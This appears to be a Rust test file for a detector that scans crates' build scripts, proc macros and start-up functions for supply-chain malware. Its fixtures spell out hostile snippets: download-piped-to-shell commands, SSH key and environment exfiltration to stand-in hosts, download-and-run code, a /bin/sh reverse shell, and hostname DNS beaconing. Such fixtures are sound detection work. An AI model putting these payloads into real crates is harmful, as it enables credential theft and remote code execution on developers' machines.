//! The Rust reader, unit by unit: each test exercises one capability on a minimal fragment.
//!
//! The fragments are not copies of any real sample. Where one needs an address it uses a documentation
//! range (203.0.113.0/24) or a `.invalid` host, and nothing here is ever built or run.

use super::*;

fn u32s(s: &str) -> Vec<u32> {
    s.chars().map(|c| c as u32).collect()
}

fn st(v: &[u32]) -> String {
    v.iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect()
}

fn read(files: &[(&str, &str)], opts: Options) -> Answer {
    let texts: Vec<Vec<u32>> = files.iter().map(|(_, t)| u32s(t)).collect();
    let input: Vec<(PyStr, &[u32])> = files.iter().zip(texts.iter()).map(|((p, _), t)| (u32s(p), t.as_slice())).collect();
    let pack = crate::pack::current();
    read_crate(&pack, &input, &opts)
}

fn build_opts() -> Options {
    Options { build: Some(u32s("build.rs")), ..Options::default() }
}

fn rs(f: &Option<Found>) -> Vec<String> {
    f.as_ref().map(|f| f.reasons.iter().map(|r| st(r)).collect()).unwrap_or_default()
}

fn has(rs: &[String], part: &str) -> bool {
    rs.iter().any(|r| r.contains(part))
}

/// Every reason the answer holds, across the build script, the macros, the start-up functions and the rest.
fn all(a: &Answer) -> Vec<String> {
    a.build.iter().chain(&a.macros).chain(&a.start).chain(&a.uses).flat_map(|f| f.reasons.iter().map(|r| st(r))).collect()
}

/// A build script that runs the one statement in `main`.
fn build(stmt: &str) -> Answer {
    let src = format!("use std::process::Command;\nfn main() {{\n    {}\n}}\n", stmt);
    read(&[("build.rs", &src), ("src/lib.rs", "pub fn f() {}\n")], build_opts())
}

#[test]
fn a_build_script_with_no_risk_is_clean() {
    // what build scripts do: read env, write to OUT_DIR, print cargo directives
    let src = r#"
use std::env;
use std::fs;
fn main() {
    let out = env::var("OUT_DIR").unwrap();
    fs::write(format!("{}/gen.rs", out), "pub const N: u8 = 1;").unwrap();
    println!("cargo:rerun-if-changed=build.rs");
    let _ = std::process::Command::new("protoc").arg("--version").output();
}
"#;
    let a = read(&[("build.rs", src), ("src/lib.rs", LIB)], build_opts());
    assert_eq!(a.build, None, "a plain build script");
    assert!(a.read.len() >= 2);
}

const LIB: &str = "pub fn f() -> u8 { 1 }\n";

#[test]
fn a_command_that_pipes_a_download_into_a_shell() {
    let a = build(r#"Command::new("sh").arg("-c").arg("curl -s https://example.invalid/s | sh").status().unwrap();"#);
    assert!(has(&rs(&a.build), "pipes a download into a shell"), "{:?}", rs(&a.build));
}

#[test]
fn a_shell_command_built_from_pieces() {
    // the program and the flag are constants; the URL is concatenated
    let a = build(r#"let url = String::from("https://example.invalid/") + "s.sh"; Command::new("bash").args(["-c", &format!("wget -O - {} | bash", url)]).spawn().unwrap();"#);
    assert!(has(&rs(&a.build), "pipes a download into a shell"), "{:?}", rs(&a.build));
}

#[test]
fn an_address_decoded_from_base64_then_contacted() {
    let a = build(r#"let url = String::from_utf8(base64::engine::general_purpose::STANDARD.decode("aHR0cDovLzIwMy4wLjExMy41L3M=").unwrap()).unwrap(); reqwest::blocking::get(&url).unwrap();"#);
    // 203.0.113.5 is the decoded address
    assert!(has(&rs(&a.build), "203.0.113.5") || has(&rs(&a.build), "an address typical of data exfiltration"), "{:?}", rs(&a.build));
}

#[test]
fn credentials_read_and_sent() {
    let a = build(r#"let k = std::fs::read_to_string(dirs::home_dir().unwrap().join(".ssh/id_rsa")).unwrap(); reqwest::blocking::Client::new().post("https://example.invalid/c").body(k).send().unwrap();"#);
    let r = rs(&a.build);
    // a build script's test is the install test: every reason CRITICAL, so the credential file read and sent is a finding
    assert!(has(&r, "reads files outside the package and sends them") || has(&r, ".ssh"), "{:?}", r);
}

#[test]
fn the_whole_environment_sent() {
    let a = build(r#"let body = std::env::vars().map(|(k, v)| format!("{}={}", k, v)).collect::<Vec<_>>().join("\n"); ureq::post("https://example.invalid/e").send_string(&body).unwrap();"#);
    let r = rs(&a.build);
    assert!(has(&r, "environment") || has(&r, "reads credentials or the whole environment"), "{:?}", r);
}

#[test]
fn a_download_written_to_a_file_then_run() {
    let src = r#"
use std::process::Command;
fn main() {
    let resp = reqwest::blocking::get("https://example.invalid/p").unwrap();
    let bytes = resp.bytes().unwrap();
    std::fs::write("/tmp/p", &bytes).unwrap();
    Command::new("/tmp/p").spawn().unwrap();
}
"#;
    let a = read(&[("build.rs", src), ("src/lib.rs", LIB)], build_opts());
    let r = rs(&a.build);
    assert!(has(&r, "downloads a file and then runs it") || has(&r, "downloads a script and runs it"), "{:?}", r);
}

#[test]
fn a_connection_whose_stdio_is_a_shell() {
    let src = r#"
use std::process::{Command, Stdio};
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
fn main() {
    let s = TcpStream::connect("203.0.113.5:4444").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh").stdin(unsafe { Stdio::from_raw_fd(fd) }).stdout(unsafe { Stdio::from_raw_fd(fd) }).spawn().unwrap();
}
"#;
    let a = read(&[("build.rs", src), ("src/lib.rs", LIB)], build_opts());
    assert!(has(&rs(&a.build), "reverse shell"), "{:?}", rs(&a.build));
}

#[test]
fn a_proc_macro_crate_is_read_as_build_time() {
    // a proc-macro crate's library runs inside the compiler of whoever uses it
    let src = r#"
use proc_macro::TokenStream;
#[proc_macro]
pub fn mac(input: TokenStream) -> TokenStream {
    std::process::Command::new("sh").arg("-c").arg("curl -s https://example.invalid/s | sh").spawn().ok();
    input
}
"#;
    let a = read(&[("src/lib.rs", src)], Options { proc_macro: true, ..Options::default() });
    assert!(has(&rs(&a.macros), "pipes a download into a shell"), "{:?}", rs(&a.macros));
}

#[test]
fn a_crate_with_a_proc_macro_function_is_a_proc_macro_crate_whatever_its_manifest_says() {
    // rustc builds a `#[proc_macro]` function in a procedural-macro crate only, so the whole library is build-time code
    // even when the manifest's flag was not read as one (`crate-type = ["proc-macro"]`, cargo's other spelling): a
    // function the macro does not call is read as build-time code too, not as code run when called
    let src = r#"
use proc_macro::TokenStream;
#[proc_macro]
pub fn mac(input: TokenStream) -> TokenStream {
    input
}
pub fn helper() {
    std::process::Command::new("sh").arg("-c").arg("curl -s https://example.invalid/s | sh").spawn().ok();
}
"#;
    let a = read(&[("src/lib.rs", src)], Options::default());
    assert!(has(&rs(&a.macros), "pipes a download into a shell"), "{:?}", rs(&a.macros));
    assert!(a.uses.is_empty(), "nothing in a procedural-macro crate runs when called: {:?}", a.uses.len());
}

#[test]
fn a_ctor_runs_at_start() {
    let src = r#"
#[ctor::ctor]
fn init() {
    std::process::Command::new("sh").arg("-c").arg("curl -s https://example.invalid/s | sh").spawn().ok();
}
pub fn f() {}
"#;
    let a = read(&[("src/lib.rs", src)], Options::default());
    assert_eq!(a.start.len(), 1, "a ctor is a start-up function");
    // the import-time wording for the same behaviour
    assert!(has(&a.start[0].reasons.iter().map(|r| st(r)).collect::<Vec<_>>(), "runs a downloaded script through a shell"));
}

#[test]
fn a_dns_lookup_of_a_name_built_from_the_hostname() {
    // the shape of the Go DNS backdoor, in Rust: the host name in a name looked up
    let src = r#"
use trust_dns_resolver::Resolver;
pub fn beacon() {
    let h = hostname::get().unwrap().into_string().unwrap();
    let r = Resolver::from_system_conf().unwrap();
    // (a public domain: a name under a local one, `.invalid` among them, is what network code resolves; example.com is
    // a documentation domain)
    let _ = r.txt_lookup(format!("{}.c.example.com", h));
}
"#;
    let a = read(&[("src/lib.rs", src)], Options::default());
    let r: Vec<String> = a.uses.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect();
    assert!(has(&r, "DNS lookup of a name it builds"), "{:?}", r);
}

#[test]
fn use_time_code_only_counts_what_it_reached() {
    // a payload in a method the crate runs only when used: SC-USE-RISK reads it
    let src = r#"
pub struct Logger;
impl Logger {
    pub fn new() -> Self { Logger }
    pub fn flush(&self) {
        let env = std::env::vars().map(|(k, v)| format!("{}={}", k, v)).collect::<Vec<_>>().join("\n");
        reqwest::blocking::Client::new().post("https://example.invalid/c").body(env).send().ok();
    }
}
"#;
    let a = read(&[("src/lib.rs", src)], Options::default());
    assert!(a.build.is_none() && a.start.is_empty());
    let r: Vec<String> = a.uses.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect();
    assert!(!r.is_empty(), "the logger's payload is read when used");
    assert!(a.use_read.files >= 1);
}

#[test]
fn tests_and_examples_are_not_read() {
    let a = read(
        &[
            ("src/lib.rs", LIB),
            ("tests/it.rs", r#"fn main() { std::process::Command::new("sh").arg("-c").arg("curl https://example.invalid | sh").status().ok(); }"#),
            ("examples/e.rs", r#"fn main() { reqwest::blocking::get("https://example.invalid/e").ok(); }"#),
        ],
        Options::default(),
    );
    // the files are classified but not read for what their code does
    let paths = ["src/lib.rs"];
    assert_eq!(a.read.len(), paths.len(), "only src/lib.rs is a built file");
    assert!(all(&a).is_empty(), "{:?}", all(&a));
}

#[test]
fn a_cfg_test_module_is_left_out() {
    let src = r#"
pub fn f() -> u8 { 1 }
#[cfg(test)]
mod tests {
    pub fn helper() {
        std::process::Command::new("sh").arg("-c").arg("curl https://example.invalid | sh").status().ok();
    }
}
"#;
    let a = read(&[("src/lib.rs", src)], Options::default());
    let r: Vec<String> = a.uses.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect();
    assert!(r.is_empty(), "code under cfg(test) is not read: {:?}", r);
}

#[test]
fn a_followed_function_in_another_module() {
    let lib = "mod net;\npub fn run() { net::send(std::env::vars().map(|(k, v)| format!(\"{}={}\", k, v)).collect::<Vec<_>>().join(\"\\n\")); }\n";
    let net = "pub fn send(s: String) { reqwest::blocking::Client::new().post(\"https://example.invalid/c\").body(s).send().ok(); }\n";
    let a = read(&[("src/lib.rs", lib), ("src/net.rs", net)], Options::default());
    let r: Vec<String> = a.uses.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect();
    assert!(!r.is_empty(), "the token's flow crosses the module boundary: {:?}", r);
}

#[test]
fn a_library_loaded_from_a_written_file() {
    let src = r#"
pub fn load() {
    let b = reqwest::blocking::get("https://example.invalid/x.so").unwrap().bytes().unwrap();
    std::fs::write("/tmp/x.so", &b).unwrap();
    unsafe { libloading::Library::new("/tmp/x.so").unwrap(); }
}
"#;
    let a = read(&[("src/lib.rs", src)], Options::default());
    let r: Vec<String> = a.uses.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect();
    assert!(has(&r, "downloads") || has(&r, "runs"), "a downloaded library is loaded: {:?}", r);
}

#[test]
fn an_empty_or_unparsable_crate_is_clean_and_does_not_panic() {
    let a = read(&[("src/lib.rs", "")], Options::default());
    assert_eq!(a.build, None);
    let a = read(&[("src/lib.rs", "fn f( { let x = ] ; } struct")], Options::default());
    assert!(a.build.is_none());
    // a deeply nested body is read without overflowing the stack
    let deep = format!("pub fn f() {{ {}{} }}", "if true { ".repeat(4000), "}".repeat(4000));
    let _ = read(&[("src/lib.rs", &deep)], Options::default());
}

// ---- the review of R-1's first part (Oct 4): bounds, a panic, two signs too wide ----

/// A build script whose `main` holds `body`.
fn build_body(body: &str) -> Answer {
    let src = format!("fn main() {{\n{}\n}}\n", body);
    read(&[("build.rs", &src), ("src/lib.rs", LIB)], build_opts())
}

#[test]
fn a_long_assignment_chain_reads_without_overflowing() {
    // (RR-1) each `=` was read by a call of the reader within the last, with no bound
    let _ = build_body(&format!("let mut a = 1; {}1;", "a = ".repeat(200_000)));
}

#[test]
fn labels_and_move_chains_read_without_overflowing() {
    let _ = build_body(&format!("let x = {}loop {{}};", "'a: ".repeat(200_000)));
    let _ = build_body(&format!("let x = {}y;", "move ".repeat(200_000)));
}

#[test]
fn a_long_else_if_chain_reads_without_overflowing() {
    let _ = build_body(&format!("if a {{ f(); }}{}", " else if a { f(); }".repeat(100_000)));
}

#[test]
fn deep_patterns_read_without_overflowing() {
    let _ = build_body(&format!("let {}x = 1;", "&".repeat(200_000)));
    let _ = build_body(&format!("let {}x = 1;", "x @ ".repeat(200_000)));
    let _ = build_body(&format!("let {}x{} = 1;", "(".repeat(50_000), ")".repeat(50_000)));
    let _ = build_body(&format!("let {}x{} = 1;", "Some(".repeat(50_000), ")".repeat(50_000)));
}

#[test]
fn a_long_function_type_chain_reads_without_overflowing() {
    let _ = build_body(&format!("let f: {}u8 = g();", "fn() -> ".repeat(100_000)));
    let _ = build_body(&format!("let f: &dyn {}u8 = g();", "Fn() -> ".repeat(100_000)));
}

#[test]
fn long_postfix_and_operator_chains_are_evaluated_without_overflowing() {
    // (RR-2) a chain the reader builds as nested nodes is as deep as it is long: evaluating it, or dropping it,
    // recursed that deep
    let _ = build_body(&format!("let x = y{};", ".f()".repeat(100_000)));
    let _ = build_body(&format!("let x = y{};", ".z".repeat(100_000)));
    let _ = build_body(&format!("let x = y{};", "[0]".repeat(100_000)));
    let _ = build_body(&format!("let x = String::new(){};", " + \"a\"".repeat(100_000)));
}

#[test]
fn a_long_concatenation_keeps_its_text() {
    // a command spelled one character at a time: the chain is read flat, its text whole
    let cmd = "curl -s https://example.invalid/s | sh";
    let pieces: Vec<String> = cmd.chars().map(|c| format!("\"{}\"", c)).collect();
    let a = build_body(&format!("let s = String::new() + {};\nstd::process::Command::new(\"sh\").arg(\"-c\").arg(&s).status().unwrap();", pieces.join(" + ")));
    assert!(has(&rs(&a.build), "pipes a download into a shell"), "{:?}", rs(&a.build));
}

#[test]
fn reading_a_response_with_no_argument_does_not_panic() {
    // (RR-5) `read_to_string` on a response took its first argument by index
    let a = build_body("let mut r = reqwest::blocking::get(\"https://example.invalid/x\")?;\nr.read_to_string();\nr.read_to_end();");
    let _ = a;
}

#[test]
fn a_response_unwrapped_is_still_the_response() {
    // (RR-9) `unwrap` on a response gave the data received, not the response: `copy_to` wrote nothing
    let a = build_body("let mut f = std::fs::File::create(\"/tmp/p\").unwrap();\nreqwest::blocking::get(\"https://example.invalid/p\").unwrap().copy_to(&mut f).unwrap();\nstd::process::Command::new(\"/tmp/p\").spawn().unwrap();");
    assert!(has(&rs(&a.build), "downloads a file and then runs it"), "{:?}", rs(&a.build));
}

#[test]
fn the_events_of_a_reading_are_bounded() {
    // (RR-3) a file written then run is matched against every file written: events bounded only by steps made
    // that quadratic
    let f = "fn w() { let b = reqwest::blocking::get(\"https://example.invalid/p\").unwrap().bytes().unwrap(); std::fs::write(\"/tmp/p\", &b).unwrap(); std::process::Command::new(\"/tmp/p\").spawn().unwrap(); }\n";
    let src = format!("{}fn main() {{\n{}\n}}\n", f, "w();\n".repeat(60_000));
    let texts: Vec<Vec<u32>> = vec![u32s(&src), u32s(LIB)];
    let input: Vec<(PyStr, &[u32])> = vec![(u32s("build.rs"), texts[0].as_slice()), (u32s("src/lib.rs"), texts[1].as_slice())];
    let pack = crate::pack::current();
    let paths: Vec<PyStr> = input.iter().map(|(p, _)| p.clone()).collect();
    let trees: Vec<crate::rsparse::Tree> = input.iter().map(|(_, t)| crate::rsparse::parse(t)).collect();
    let mut files = Vec::new();
    for (k, tree) in trees.into_iter().enumerate() {
        files.push(eval::FileRef { path: paths[k].clone(), src: input[k].1, tree, uses: Default::default(), unit: if k == 0 { UNIT_BUILD } else { UNIT_LIB }, test_items: Default::default() });
    }
    let mut krate = eval::Krate { files, fns: Default::default(), consts: Default::default(), b64_fns: Default::default() };
    index(&mut krate);
    let main = krate.fns.get(&(UNIT_BUILD, u32s("main"))).expect("main")[0];
    let mut m = eval::Model::new(&krate, &pack);
    m.max_steps = 3_000_000;
    m.run_root(main.0, main.1);
    m.flush_cmds();
    assert!(m.events.len() <= eval::MAX_EVENTS, "{} events", m.events.len());
    let t = std::time::Instant::now();
    let f = crate::model::facts::facts(&pack, input[0].1, &m.events, 0);
    assert!(f.facts.dropped.is_some(), "the first file written then run is still found");
    assert!(t.elapsed().as_secs() < 5, "facts took {:?}", t.elapsed());
}

#[test]
fn text_copied_is_charged_to_the_reading() {
    // (RR-4) each step could copy a text of 64K characters: a reading of a few thousand statements copied gigabytes
    let src = format!("fn main() {{\nlet mut s = String::from(\"ab\");\n{}\n}}\n", "s = s.clone() + &s;\n".repeat(20_000));
    let texts: Vec<Vec<u32>> = vec![u32s(&src)];
    let pack = crate::pack::current();
    let tree = crate::rsparse::parse(&texts[0]);
    let files = vec![eval::FileRef { path: u32s("build.rs"), src: &texts[0], tree, uses: Default::default(), unit: UNIT_BUILD, test_items: Default::default() }];
    let mut krate = eval::Krate { files, fns: Default::default(), consts: Default::default(), b64_fns: Default::default() };
    index(&mut krate);
    let main = krate.fns.get(&(UNIT_BUILD, u32s("main"))).expect("main")[0];
    let mut m = eval::Model::new(&krate, &pack);
    m.max_steps = 3_000_000;
    let t = std::time::Instant::now();
    m.run_root(main.0, main.1);
    assert!(m.out_of_steps(), "copying 64K characters 20,000 times costs more than 3M steps ({} used)", m.steps_used());
    assert!(t.elapsed().as_secs() < 5, "took {:?}", t.elapsed());
}

#[test]
fn a_dns_lookup_counts_only_for_a_name_built_with_a_public_domain() {
    // (RR-7) as the text detector reads it (dns_built): the host name itself, or a name under a local domain, is
    // what network code resolves
    let quiet = [
        "pub fn f() { let h = hostname::get().unwrap().into_string().unwrap(); let _ = dns_lookup::lookup_host(&h); }",
        "pub fn f() { let h = hostname::get().unwrap().into_string().unwrap(); let _ = dns_lookup::lookup_host(&format!(\"{}.local\", h)); }",
        "pub fn f() { let h = hostname::get().unwrap().into_string().unwrap(); let _ = dns_lookup::lookup_host(&format!(\"{}.svc.cluster.internal\", h)); }",
    ];
    for src in quiet {
        let a = read(&[("src/lib.rs", src)], Options::default());
        assert!(!has(&all(&a), "DNS lookup"), "{}: {:?}", src, all(&a));
    }
    let src = "pub fn f() { let h = hostname::get().unwrap().into_string().unwrap(); let _ = dns_lookup::lookup_host(&format!(\"{}.c.example.com\", h)); }";
    let a = read(&[("src/lib.rs", src)], Options::default());
    assert!(has(&all(&a), "DNS lookup of a name it builds"), "{:?}", all(&a));
}

#[test]
fn a_connection_as_a_programs_input_is_a_reverse_shell_only_for_a_shell() {
    // (RR-8) a tunnel hands the connection it opens to a program of its own; a reverse shell hands it to a shell
    let handler = r#"
use std::process::{Command, Stdio};
use std::os::unix::io::{AsRawFd, FromRawFd};
pub fn serve() {
    let s = std::net::TcpStream::connect("203.0.113.5:4444").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/usr/libexec/handler").stdin(unsafe { Stdio::from_raw_fd(fd) }).stdout(unsafe { Stdio::from_raw_fd(fd) }).spawn().unwrap();
}
"#;
    let a = read(&[("src/lib.rs", handler)], Options::default());
    assert!(!has(&all(&a), "reverse shell"), "{:?}", all(&a));
    let shell = handler.replace("/usr/libexec/handler", "/bin/sh");
    let a = read(&[("src/lib.rs", &shell)], Options::default());
    assert!(has(&all(&a), "reverse shell"), "{:?}", all(&a));
}

#[test]
fn a_build_script_payload_many_calls_deep_is_read() {
    // (RR-10) the reading follows calls 8 deep: a build script's code past that was never read, and with a model the
    // text test does not look for a download piped into a shell
    let mut src = String::from("use std::process::Command;\nfn main() { f0(); }\n");
    for k in 0..12 {
        src.push_str(&format!("fn f{}() {{ f{}(); }}\n", k, k + 1));
    }
    src.push_str("fn f12() { Command::new(\"sh\").arg(\"-c\").arg(\"curl -s https://example.invalid/s | sh\").status().unwrap(); }\n");
    let a = read(&[("build.rs", &src), ("src/lib.rs", LIB)], build_opts());
    assert!(has(&rs(&a.build), "pipes a download into a shell"), "{:?}", rs(&a.build));
}

#[test]
fn a_build_script_that_spends_its_steps_first_is_read_by_the_text_test() {
    // (RR-10) calls that fan out spend the reading's steps before the payload's statement is reached: the reading is
    // cut short, and the text is read by the text test as well
    let mut src = String::from("use std::process::Command;\nfn main() {\n    p0();\n    Command::new(\"sh\").arg(\"-c\").arg(\"curl -s https://example.invalid/s | sh\").status().unwrap();\n}\n");
    for k in 0..6 {
        src.push_str(&format!("fn p{}() {{ {} }}\n", k, format!("p{}(); ", k + 1).repeat(12)));
    }
    src.push_str("fn p6() { let x = 1; }\n");
    let a = read(&[("build.rs", &src), ("src/lib.rs", LIB)], build_opts());
    assert!(has(&rs(&a.build), "pipes a download into a shell"), "{:?}", rs(&a.build));
}

#[test]
fn a_start_up_function_reaches_its_payload_however_deep() {
    // (RR-10) a ctor's code is what it calls, however deep: read at start, not left to the use-time test
    let mut src = String::from("#[ctor::ctor]\nfn init() { a0(); }\n");
    for k in 0..12 {
        src.push_str(&format!("fn a{}() {{ a{}(); }}\n", k, k + 1));
    }
    src.push_str("fn a12() { std::process::Command::new(\"sh\").arg(\"-c\").arg(\"curl -s https://example.invalid/s | sh\").spawn().ok(); }\npub fn f() {}\n");
    let a = read(&[("src/lib.rs", &src)], Options::default());
    let start: Vec<String> = a.start.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect();
    assert!(has(&start, "runs a downloaded script through a shell"), "start: {:?}, uses: {:?}", start, all(&a));
}

#[test]
fn the_evaluators_nesting_is_bounded() {
    // (RR-2) each function 90 blocks deep around the call of the next, 8 calls deep: the evaluator's nesting stops at
    // MAX_NEST, inside a test thread's stack
    let mut src = String::from("fn main() { g0(); }\n");
    for k in 0..8 {
        src.push_str(&format!("fn g{}() {{ {}g{}();{} }}\n", k, "{ ".repeat(90), k + 1, " }".repeat(90)));
    }
    src.push_str("fn g8() { std::process::Command::new(\"sh\").arg(\"-c\").arg(\"curl -s https://example.invalid/s | sh\").status().unwrap(); }\n");
    let a = read(&[("build.rs", &src), ("src/lib.rs", LIB)], build_opts());
    // (the payload is past the bound for the reading from main, and read on its own)
    assert!(has(&rs(&a.build), "pipes a download into a shell"), "{:?}", rs(&a.build));
}

#[test]
fn code_built_only_with_tests_is_left_out_however_its_cfg_is_written() {
    // (RR-11) `all(feature = "x", test)` was read as library code; `any(test, …)` and `not(test)` are built without tests
    let src = r#"
pub fn f() -> u8 { 1 }
#[cfg(all(feature = "x", test))]
mod tests {
    pub fn helper() {
        std::process::Command::new("sh").arg("-c").arg("curl https://example.invalid | sh").status().ok();
    }
}
"#;
    let a = read(&[("src/lib.rs", src)], Options::default());
    assert!(all(&a).is_empty(), "{:?}", all(&a));
    for cfg in ["any(test, feature = \"x\")", "not(test)", "all(not(test), unix)"] {
        let src = src.replace("all(feature = \"x\", test)", cfg);
        let a = read(&[("src/lib.rs", &src)], Options::default());
        assert!(!all(&a).is_empty(), "{} is built without tests", cfg);
    }
    assert!(only_in_tests("test") && only_in_tests("all(test,unix)") && only_in_tests("all(unix,test)"));
    assert!(!only_in_tests("all(not(test),unix)") && !only_in_tests("any(test,unix)") && !only_in_tests("all(testing)"));
}
